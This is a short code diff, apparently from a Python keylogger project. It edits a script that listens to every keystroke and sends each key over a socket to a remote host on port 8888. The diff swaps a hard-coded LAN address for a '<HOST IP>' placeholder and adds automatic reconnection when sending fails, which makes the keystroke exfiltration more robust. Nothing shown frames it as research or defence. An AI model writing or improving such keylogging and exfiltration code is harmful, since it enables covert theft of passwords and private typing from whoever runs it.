@@ -3,7 +3,7 @@ import socket
 import time
 
 def connect_to_host():
-	server_address = ("192.168.123.41", 8888)
+	server_address = ("<HOST IP>", 8888)
 	while True:
 		try:
 			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -29,7 +29,7 @@ def on_press(key):
 	try:
 		sock.send(pressed_key.encode())
 	except socket.error:
-		pass
+		sock = connect_to_host()
 
 
 with keyboard.Listener(on_press=on_press) as logger:
